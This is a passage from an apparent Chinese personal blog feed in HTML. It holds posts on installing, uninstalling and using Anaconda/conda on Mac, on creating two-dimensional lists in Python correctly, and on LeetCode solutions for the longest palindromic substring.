class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">source</span> ~/.bash_profile</span><br></pre></td></tr></table></figure><br>如果安装了<code>oh-my-zsh</code><br>还需要编辑 <code>.zshrc</code>文件，同样添加上面的一行，之后别忘了<code>source</code></p><hr><p>我们输入<code>python</code>即可进入<code>anaconda</code><br><img src="/2019/12/03/anaconda-installformac/1.png" alt="1.png"></p><h3 id="4-关于卸载"><a href="#4-关于卸载" class="headerlink" title="4.关于卸载"></a>4.关于卸载</h3><p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rm -rf ~/anaconda3</span><br><span class="line">open ~/.bash_profile</span><br><span class="line"><span class="hljs-comment"># 删除路径</span></span><br><span class="line"></span><br><span class="line">rm -rf ~/.condarc ~/.conda ~/.continuum</span><br></pre></td></tr></table></figure></p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><h4 id="环境管理"><a href="#环境管理" class="headerlink" title="环境管理"></a>环境管理</h4><h5 id="1-查看当前系统下的环境"><a href="#1-查看当前系统下的环境" class="headerlink" title="1. 查看当前系统下的环境"></a>1. 查看当前系统下的环境</h5><p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda info -e</span><br></pre></td></tr></table></figure></p><h5 id="2-查看环境管理的全部命令操作"><a href="#2-查看环境管理的全部命令操作" class="headerlink" title="2. 查看环境管理的全部命令操作"></a>2. 查看环境管理的全部命令操作</h5><p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda env -h</span><br></pre></td></tr></table></figure></p><h5 id="3-创建环境"><a href="#3-创建环境" class="headerlink" title="3. 创建环境"></a>3. 创建环境</h5><p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># 创建新环境</span></span><br><span class="line">conda create env_name</span><br><span class="line"><span class="hljs-comment">#创建制定python版本的环境</span></span><br><span class="line">conda create env_name python=3.6</span><br><span class="line"><span class="hljs-comment">#创建包含某些包的环境</span></span><br><span class="line">conda create env_name numpy scipy</span><br><span class="line"><span class="hljs-comment">#创建指定python版本下包含某些包的环境</span></span><br><span class="line">conda create env_name python=3.6  numpy scipy</span><br></pre></td></tr></table></figure></p><h5 id="4-激活进入某个环境"><a href="#4-激活进入某个环境" class="headerlink" title="4. 激活进入某个环境"></a>4. 激活进入某个环境</h5><ul><li>win<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda activate env_name</span><br></pre></td></tr></table></figure></li><li>mac<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">source</span> activate env_name</span><br></pre></td></tr></table></figure></li></ul><h5 id="5-退出某个环境"><a href="#5-退出某个环境" class="headerlink" title="5. 退出某个环境"></a>5. 退出某个环境</h5><p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda deactivate env_name</span><br></pre></td></tr></table></figure></p><h5 id="6-复制某个环境"><a href="#6-复制某个环境" class="headerlink" title="6. 复制某个环境"></a>6. 复制某个环境</h5><p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda create new_env_name old_env_name</span><br></pre></td></tr></table></figure></p><h5 id="7-删除某个环境"><a href="#7-删除某个环境" class="headerlink" title="7. 删除某个环境"></a>7. 删除某个环境</h5><p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda env remove -n env_name</span><br></pre></td></tr></table></figure></p><h4 id="包管理"><a href="#包管理" class="headerlink" title="包管理"></a>包管理</h4><h5 id="1-查看当前环境下已安装的包"><a href="#1-查看当前环境下已安装的包" class="headerlink" title="1. 查看当前环境下已安装的包"></a>1. 查看当前环境下已安装的包</h5><p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda list</span><br></pre></td></tr></table></figure></p><h5 id="2-查看指定环境下的包"><a href="#2-查看指定环境下的包" class="headerlink" title="2. 查看指定环境下的包"></a>2. 查看指定环境下的包</h5><p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda list -n xxx</span><br></pre></td></tr></table></figure></p><h5 id="3-查找包"><a href="#3-查找包" class="headerlink" title="3. 查找包"></a>3. 查找包</h5><p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda search xxx</span><br></pre></td></tr></table></figure></p><h5 id="4-更新包"><a href="#4-更新包" class="headerlink" title="4. 更新包"></a>4. 更新包</h5><p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda update xxx</span><br></pre></td></tr></table></figure></p><h5 id="5-安装包"><a href="#5-安装包" class="headerlink" title="5. 安装包"></a>5. 安装包</h5><p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conda install xxx</span><br><span class="line">pip install xxx</span><br></pre></td></tr></table></figure></p><h5 id="6-指定的安装环境"><a href="#6-指定的安装环境" class="headerlink" title="6. 指定的安装环境"></a>6. 指定的安装环境</h5><p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda install -n env_name xxx</span><br></pre></td></tr></table></figure></p><h5 id="7-安装anaconda发行版中的所有包"><a href="#7-安装anaconda发行版中的所有包" class="headerlink" title="7. 安装anaconda发行版中的所有包"></a>7. 安装anaconda发行版中的所有包</h5><p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda install anaconda</span><br></pre></td></tr></table></figure></p><h5 id="8-卸载包"><a href="#8-卸载包" class="headerlink" title="8. 卸载包"></a>8. 卸载包</h5><p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda remove xxx</span><br></pre></td></tr></table></figure></p><h4 id="conda管理"><a href="#conda管理" class="headerlink" title="conda管理"></a>conda管理</h4><h5 id="0-conda修改源"><a href="#0-conda修改源" class="headerlink" title="0. conda修改源"></a>0. conda修改源</h5><p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free</span><br><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main</span><br><span class="line">conda config --<span class="hljs-built_in">set</span> show_channel_urls yes</span><br></pre></td></tr></table></figure><br>换回默认源<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda config --remove-key channels</span><br></pre></td></tr></table></figure><br>在执行conda config 命令的时候会在当前用户目录下创建 .condarc  文件，可以查看更换源前后该文件内容的变化。</p><h5 id="1-检查conda版本"><a href="#1-检查conda版本" class="headerlink" title="1. 检查conda版本"></a>1. 检查conda版本</h5><p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda --version</span><br></pre></td></tr></table></figure></p><h5 id="2-升级当前版本的conda"><a href="#2-升级当前版本的conda" class="headerlink" title="2. 升级当前版本的conda"></a>2. 升级当前版本的conda</h5><p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda update conda</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;简单记录一下在Mac下Anaconda安装的过程&lt;/p&gt;
    
    </summary>
    
    
      <category term="Daily Essays" scheme="https://fansblog.club/categories/Daily-Essays/"/>
    
    
  </entry>
  
  <entry>
    <title>Python中如何定义二维数组</title>
    <link href="https://fansblog.club/2019/11/17/py-cre-douarr/"/>
    <id>https://fansblog.club/2019/11/17/py-cre-douarr/</id>
    <published>2019-11-17T06:56:50.000Z</published>
    <updated>2019-11-17T07:16:56.732Z</updated>
    
    <content type="html"><![CDATA[<p>小知识点随手记录…<a id="more"></a></p><h3 id="Numpy"><a href="#Numpy" class="headerlink" title="Numpy"></a>Numpy</h3><p>或许你会说用numpy中的数组不就可以了，想定义几维就几维，没错numpy确实方便很多。<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> numpy</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a = numpy.zeros((<span class="hljs-number">2</span>,<span class="hljs-number">3</span>))</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a</span><br><span class="line">array([[<span class="hljs-number">0.</span>, <span class="hljs-number">0.</span>, <span class="hljs-number">0.</span>],</span><br><span class="line">       [<span class="hljs-number">0.</span>, <span class="hljs-number">0.</span>, <span class="hljs-number">0.</span>]])</span><br></pre></td></tr></table></figure><br>但如果不用numpy呢？</p><h3 id="List"><a href="#List" class="headerlink" title="List"></a>List</h3><p>有人会说可以定义一个二维列表代替二维数组呗。</p><h4 id="1-错误方式"><a href="#1-错误方式" class="headerlink" title="1. 错误方式"></a>1. 错误方式</h4><p>一开始一定会有人这样定义<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a = [[<span class="hljs-number">0</span>]*<span class="hljs-number">3</span>]*<span class="hljs-number">2</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><br>看是不是成功了，但当我们修改其中的某个值的时候，就会发现奇怪的地方<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[[<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><br>特么的怎么连<code>a[1][0]</code>也跟着变成1了，因为上面的定义方式等价于：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>temp_list = [<span class="hljs-number">0</span>] * <span class="hljs-number">3</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a = [temp_list, temp_list]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>temp_list[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>temp_list</span><br><span class="line">[<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[[<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]</span><br></pre></td></tr></table></figure><br>所以这么用list定义二维数组的方法是错的，那么正确的方式应该怎么做呢？</p><h4 id="2-正确方式"><a href="#2-正确方式" class="headerlink" title="2. 正确方式"></a>2. 正确方式</h4><p>我们可以用for来定义二维数组。<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>arra = [ [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>)] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">2</span>)]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>arra</span><br><span class="line">[[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>arra[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>arra</span><br><span class="line">[[<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]</span><br></pre></td></tr></table></figure><br>可以看到这样做就没有上面的错误出现了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;小知识点随手记录…&lt;/p&gt;
    
    </summary>
    
    
      <category term="Daily Essays" scheme="https://fansblog.club/categories/Daily-Essays/"/>
    
    
  </entry>
  
  <entry>
    <title>LeetCode DAY 3 (5)</title>
    <link href="https://fansblog.club/2019/11/16/leetcode-day3/"/>
    <id>https://fansblog.club/2019/11/16/leetcode-day3/</id>
    <published>2019-11-16T07:56:43.000Z</published>
    <updated>2019-11-20T03:19:52.122Z</updated>
    
    <content type="html"><![CDATA[<p>这些题都好难啊…越来越觉得自己是个铁fw了…呜呜呜<a id="more"></a></p><h3 id="5-最长回文子串（中等）"><a href="#5-最长回文子串（中等）" class="headerlink" title="5. 最长回文子串（中等）"></a>5. 最长回文子串（中等）</h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定一个字符串<code>s</code>，找到<code>s</code>中最长的回文子串。你可以假设<code>s</code>的最大长度为<code>1000</code>。</p><h5 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h5><p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入: <span class="hljs-string">"babad"</span></span><br><span class="line">输出: <span class="hljs-string">"bab"</span></span><br><span class="line">注意: <span class="hljs-string">"aba"</span> 也是一个有效答案。</span><br></pre></td></tr></table></figure></p><h5 id="示例2"><a href="#示例2" class="headerlink" title="示例2:"></a>示例2:</h5><p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入: <span class="hljs-string">"cbbd"</span></span><br><span class="line">输出: <span class="hljs-string">"bb"</span></span><br></pre></td></tr></table></figure></p><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><h5 id="解法1：暴力解法"><a href="#解法1：暴力解法" class="headerlink" title="解法1：暴力解法"></a>解法1：暴力解法</h5><p>作为一个铁fw第一个想到的办法肯定是暴力解决了，lz遍历你所有的子串还不能找出答案？具体做法就是两个for循环遍历所有子串，然后在最内循环里进行判断该子串是不是回文串。<br>因此我们需要定义一个判断是否为回文串的函数，该函数也很暴力，就直接遍历该子串看对应位置的字符是否相同。因此该算法的时间复杂度为$O(n^{3})$<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#暴力解法，时间复杂度O(n^3) 空间复杂度O(1)</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">longestPalindrome</span><span class="hljs-params">(self, s)</span>:</span></span><br><span class="line">        max = <span class="hljs-number">0</span></span><br><span class="line">        s_tmp = <span class="hljs-string">''</span></span><br><span class="line">        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(s)):</span><br><span class="line">            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(i+<span class="hljs-number">1</span>, len(s)+<span class="hljs-number">1</span>):</span><br><span class="line">                <span class="hljs-keyword">if</span> self.isPalindrome(s[i:j]) <span class="hljs-keyword">and</span> (j-i) &gt; max :</span><br><span class="line">                    s_tmp = s[i:j]</span><br><span class="line">                    max = j-i</span><br><span class="line">        <span class="hljs-keyword">return</span> s_tmp</span><br><span class="line">    <span class="hljs-comment">#判断是否为回文串</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">isPalindrome</span><span class="hljs-params">(self, s)</span>:</span></span><br><span class="line">        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(s)/<span class="hljs-number">2</span>):</span><br><span class="line">            <span class="hljs-keyword">if</span>(s[i] != s[len(s)-i<span class="hljs-number">-1</span>]):</span><br><span class="line">                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span></span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span></span><br></pre></td></tr></table></figure></p><h5 id="解法2：最长公共子串"><a href="#解法2：最长公共子串" class="headerlink" title="解法2：最长公共子串"></a>解法2：最长公共子串</h5><p>还有一种办法就是求最长公共子串，具体做法就是将字符串反转，找出反转前后的公共子串，就是回文串（除一种情况外），比如<code>&#39;abad&#39;</code>，反转之后为<code>&#39;daba&#39;</code>，最长公共子串就是<code>&#39;aba&#39;</code>。<br>但是有一种情况除外，比如<code>&#39;abcdefgdcba&#39;</code>，反转之后为<code>&#39;abcdgfeabcd&#39;</code>，可以看到反转前后的最长公共子串为<code>&#39;abcd&#39;</code>，但它明显不是回文串，这种情况的特征是反转前后字符下标并不一致，因此求出反转前后的最长公共子串后我们需要判断下标是否对应。<br>但现在还有最后两个问题，怎么求最大公共子串以及下标是否对应如何判断。<br>看了大佬们的解析的我恍然大悟……奈何自己太菜…</p><ul><li><strong>求最长公共子串：</strong><br>我们可以定义一个<strong>二维数组</strong>，可以想象成一个表格，横向代表原字符串序列，纵向代表反转后字符串序列，假设横向坐标用<code>i</code>表示，纵向坐标用<code>j</code>表示。数组用<code>a</code>表示。<br>当<code>s[i] == s_r[j]</code>时，就表示它是<strong>公共</strong>的一个字符，而此时对应的数组元素<code>a[i][j] == a[i-1][j-1] + 1</code>，因为<code>a[i-1][j-1]</code>的位置就是前一个<strong>连续</strong>的公共字符，因此<code>a[i][j]</code>的值就代表最长公共子串的<strong>长度</strong>，而此时的<code>i</code>代表该子串的<strong>结束位置</strong>，有了结束位置我们也就知道了<strong>开始位置</strong>，因此就可以取出该子串。<br>对于上面的计算公式<code>a[i][j] == a[i-1][j-1] + 1</code>，为了保证所有值有意义，我们需要分情况讨论，即当<code>i == 0 or j == 0</code>时进行赋值。该数组可参考下图所示：<br><img src="/2019/11/16/leetcode-day3/1.png" alt="1.png"></li><li><strong>判断下标是否对应：</strong><br>我们没有必要将公共子串的下标全部进行判断是否对应，我们只需要判断最后一个字符的下标。比如上图所示，我们将<code>i</code>和<code>j</code>对应公共子串的最后一个字符，现在<code>s_re[j]</code>的位置对应着<code>a</code>，那反转之前这个<code>a</code>的下标为<code>before = len(s)-j-1</code>，之后我们还需要加上公共子串的长度才是末尾字符的下标，因此判断<code>before + a[i][j] - 1 == i</code>，如果相等则为公共子串。</li></ul><p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#时间复杂度O(n^2) 空间复杂度O(n^2)</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">longestPalindrome</span><span class="hljs-params">(self, s)</span>:</span></span><br><span class="line">        s_reverse = s[::<span class="hljs-number">-1</span>]</span><br><span class="line">        max_len = <span class="hljs-number">0</span> <span class="hljs-comment">#最大公共子串长度</span></span><br><span class="line">        max_end = <span class="hljs-number">0</span> <span class="hljs-comment">#最大公共子串结束位置</span></span><br><span class="line">        index = &#123;&#125; <span class="hljs-comment">#构建二维数组 python中只好先定义一个字典</span></span><br><span class="line">        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,len(s)):</span><br><span class="line">            index[i] = &#123;&#125; <span class="hljs-comment">#通过循环构建二维数组</span></span><br><span class="line">            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(s)):</span><br><span class="line">                index[i][j] = <span class="hljs-number">0</span> <span class="hljs-comment">#初始化二维数组</span></span><br><span class="line">                <span class="hljs-keyword">if</span> s[i] == s_reverse[j]: </span><br><span class="line">                    <span class="hljs-keyword">if</span> i==<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> j==<span class="hljs-number">0</span>:</span><br><span class="line">                        index[i][j] = <span class="hljs-number">1</span></span><br><span class="line">                    <span class="hljs-keyword">else</span>:</span><br><span class="line">                        index[i][j] = index[i<span class="hljs-number">-1</span>][j<span class="hljs-number">-1</span>] + <span class="hljs-number">1</span></span><br><span class="line">                <span class="hljs-keyword">if</span> index[i][j] &gt; max_len: </span><br><span class="line">                    before_num = len(s) - <span class="hljs-number">1</span> - j</span><br><span class="line">                    <span class="hljs-comment">#判断是否真的是回文串</span></span><br><span class="line">                    <span class="hljs-keyword">if</span> before_num + index[i][j] - <span class="hljs-number">1</span> == i:</span><br><span class="line">                        max_len = index[i][j]</span><br><span class="line">                        max_end = i</span><br><span class="line">        <span class="hljs-keyword">return</span> s[max_end-max_len+<span class="hljs-number">1</span>:max_end+<span class="hljs-number">1</span>]</span><br></pre></td></tr></table></figure><br>但即使这个复杂度的代码提交还是时间超出限制我哭了，更低复杂度的代码等明天看懂再更……</p><h5 id="解法3：暴力破解优化"><a href="#解法3：暴力破解优化" class="headerlink" title="解法3：暴力破解优化"></a>解法3：暴力破解优化</h5><p>在解法一中，我们对每一个子串都进行了判断是不是回文串，但每一次判断都会有$O(n)$的时间复杂度，如果我们能优化掉判断带来的时间复杂度，就可以将总的时间复杂度降为$O(n^{3})$，根据回文串的特点，在$P(i,j)$是回文串的基础上，如果<code>s[i-1] == s[j+1]</code>，那么$P(i-1,j+1)$也是回文串，因此我们将暴力解法中的判断函数改为这种判断方式。但有两种情况需要特殊对待，当子串的个数是1或者2时，此时的<code>i-1</code>和<code>j+1</code>将会将<code>i</code>和<code>j</code>的顺序颠倒产生错误，因此这两种情况需要额外判断。此外，我们需要定义一个数组，用来存储$P(i,j)$是否为回文串的结果。<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#时间复杂度O(n^2) 空间复杂度O(n^2)</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">longestPalindrome</span><span class="hljs-params">(self, s)</span>:</span></span><br><span class="line">        arra = [[<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(s))] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(s))]</span><br><span class="line">        max_len = <span class="hljs-number">0</span></span><br><span class="line">        max_str = <span class="hljs-string">''</span></span><br><span class="line">        <span class="hljs-keyword">for</span> length <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, len(s)+<span class="hljs-number">1</span>):</span><br><span class="line">            <span class="hljs-keyword">for</span> start <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(s)):</span><br><span class="line">                end = start + length - <span class="hljs-number">1</span></span><br><span class="line">                <span class="hljs-keyword">if</span>(end&gt;=len(s)):</span><br><span class="line">                    <span class="hljs-keyword">break</span></span><br><span class="line">                <span class="hljs-keyword">if</span> (length==<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> length==<span class="hljs-number">2</span> <span class="hljs-keyword">or</span> arra[start+<span class="hljs-number">1</span>][end<span class="hljs-number">-1</span>]==<span class="hljs-number">1</span>) <span class="hljs-keyword">and</span> s[start] == s[end]:</span><br><span class="line">                    arra[start][end] = <span class="hljs-number">1</span></span><br><span class="line">                    <span class="hljs-keyword">if</span> length &gt; max_len:</span><br><span class="line">                        max_str = s[start:end+<span class="hljs-number">1</span>]</span><br><span class="line">                <span class="hljs-keyword">else</span>:</span><br><span class="line">                    arra[start][end] = <span class="hljs-number">0</span></span><br><span class="line">        <span class="hljs-keyword">return</span> max_str</span><br></pre></td></tr></table></figure></p><h5 id="解法4：扩展中心"><a href="#解法4：扩展中心" class="headerlink" title="解法4：扩展中心"></a>解法4：扩展中心</h5><p>我们在解法3中提到，假设一个子串$P(i,j)$为回文串，如果<code>s[i-1] == s[j+1]</code>，那$P(i-1,j+1)$也是回文串，因此我们可以在已是回文串的子串的基础上进行中心扩展，那最初的中心怎么找呢？我们可以发现，最初的子串只有长度为1和长度为2两种情况，而长度为1的子串共有<code>len(s)</code>种，长度为2的子串共有<code>len(s)-1</code>种，因此我们应该循环<code>2*len(s)-1</code>次，在循环中判断此时中心是单个字符还是两个字符，之后进行中心扩展。<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#时间复杂度O(n^2) 空间复杂度O(1)</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">longestPalindrome</span><span class="hljs-params">(self, s)</span>:</span></span><br><span class="line">        max_len = <span class="hljs-number">0</span></span><br><span class="line">        max_str = <span class="hljs-string">''</span></span><br><span class="line">        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">2</span>*len(s) - <span class="hljs-number">1</span>):</span><br><span class="line">            <span class="hljs-keyword">if</span> i % <span 